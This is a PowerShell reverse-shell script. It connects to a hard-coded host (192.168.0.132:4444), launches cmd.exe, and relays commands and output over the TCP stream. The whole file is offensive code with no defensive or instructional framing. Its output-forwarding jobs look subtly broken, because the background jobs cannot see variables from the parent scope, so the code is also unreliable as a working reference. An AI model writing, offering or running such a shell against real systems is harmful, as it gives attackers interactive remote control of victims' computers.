$client = New-Object System.Net.Sockets.TCPClient('192.168.0.132', 4444);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$writer.AutoFlush = $true;
$reader = New-Object System.IO.StreamReader($stream);
$encoding = New-Object System.Text.ASCIIEncoding;

$writer.WriteLine("Connected to Reverse Shell");

$process = New-Object Diagnostics.Process;
$process.StartInfo.FileName = "cmd.exe";
$process.StartInfo.RedirectStandardInput = $true;
$process.StartInfo.RedirectStandardOutput = $true;
$process.StartInfo.RedirectStandardError = $true;
$process.StartInfo.UseShellExecute = $false;
$process.Start();

$inputStream = $process.StandardInput;
$outputStream = $process.StandardOutput;
$errorStream = $process.StandardError;

# Redirect cmd.exe output to network stream
Start-Job {
    while ($true) {
        $output = $outputStream.ReadLine();
        if ($output -ne $null) {
            $writer.WriteLine($output);
            $writer.Flush();
        }
    }
}

Start-Job {
    while ($true) {
        $error = $errorStream.ReadLine();
        if ($error -ne $null) {
            $writer.WriteLine($error);
            $writer.Flush();
        }
    }
}

# Redirect network input to cmd.exe
while ($true) {
    $data = $reader.ReadLine();
    if ($data -ne $null) {
        $inputStream.WriteLine($data);
        $inputStream.Flush();
    }
}

$client.Close()
